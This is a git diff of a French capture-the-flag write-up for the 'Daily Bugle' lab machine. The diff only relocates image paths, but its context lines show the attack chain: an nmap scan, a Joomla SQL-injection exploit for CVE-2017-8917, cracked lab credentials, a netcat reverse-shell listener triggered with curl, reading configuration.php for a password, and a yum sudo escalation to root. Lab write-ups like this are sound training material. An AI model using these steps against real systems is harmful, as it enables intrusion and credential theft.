@@ -36,7 +36,7 @@ On commence par identifier les services exposés sur la machine cible avec un sc
 ```bash
 nmap -sC -sV -p- -T4 10.10.21.204
 ```
-![nmap](nmap.png)
+![nmap](/images/imagesdaily/nmap.png)
 
 
 {{< admonition note "Résultats Clés du Scan Nmap" >}}
@@ -49,7 +49,7 @@ Le scan révèle trois ports ouverts :
 Le service HTTP semble être notre point d'entrée principal.
 {{< /admonition >}}
 
-![site](site.png)
+![site](/images/imagesdaily/site.png)
 
 ### **2. Exploration Web - Identification de Joomla**
 
@@ -57,7 +57,7 @@ En visitant le site web sur le port 80, nous découvrons le site du Daily Bugle 
 
 Pour identifier précisément la version de Joomla et ses vulnérabilités potentielles, utilisons JoomScan :
 
-![joomscan](joomscan.png)
+![joomscan](/images/imagesdaily/joomscan.png)
 
 
 {{< admonition tip "Découverte Cruciale - Version Joomla" >}}
@@ -80,8 +80,8 @@ Utilisons un outil spécialisé pour exploiter la vulnérabilité CVE-2017-8917 
 ```bash
 python3 main.py --host 10.10.21.204
 ```
-![alt text](cvesqli.png)
-![alt text](crackjohn.png)
+![alt text](/images/imagesdaily/cvesqli.png)
+![alt text](/images/imagesdaily/crackjohn.png)
 
 L'exploitation réussit et nous permet d'extraire les informations des utilisateurs de la base de données Joomla, notamment :
 - **Utilisateur :** jonah (Super User)
@@ -111,7 +111,7 @@ Utilisateur : jonah
 Mot de passe : spiderman123
 ```
 
-![joomla](joomla.png)
+![joomla](/images/imagesdaily/joomla.png)
 
 Bingo ! On est connecté, on continue !
 
@@ -151,7 +151,7 @@ nc -lnvp 4444
 curl http://10.10.21.204/templates/protostar/error.php
 ```
 
-![reverse](reverse.png)
+![reverse](/images/imagesdaily/reverse.png)
 
 Nouvelle étape ! Unn shell en tant qu'utilisateur `apache` ! On rentre dans le dur ! 
 
@@ -173,7 +173,7 @@ Dans le fichier de configuration de Joomla (`configuration.php`), nous trouvons 
 ```bash
 cat configuration.php
 ```
-![config](configurationphp.png)
+![config](/images/imagesdaily/configurationphp.png)
 
 Nous découvrons un mot de passe : `nv5uz9r3ZEDzVjNu`
 
@@ -195,7 +195,7 @@ Le mot de passe fonctionne ! Nous sommes maintenant connectés en tant que `jjam
 ls
 cat user.txt
 ```
-![ssh](sshjonah.png)
+![ssh](/images/imagesdaily/sshjonah.png)
 
 ## **Phase 7 : Élévation de Privilèges Root**
 
@@ -215,7 +215,7 @@ User jjameson may run the following commands on dailybugle:
 ```
 {{< /admonition >}}
 
-![sudol](sudol.png)
+![sudol](/images/imagesdaily/sudol.png)
 
 ### **Exploitation via Yum (GTFOBins)**
 
@@ -247,7 +247,7 @@ EOF
 
 sudo yum -c $TF/x --enableplugin=y
 ```
-![root](root.png)
+![root](/images/imagesdaily/root.png)
 
 {{< admonition success "Root Obtenu !" >}}
 Nous obtenons un shell root ! L'exploitation via yum fonctionne parfaitement.
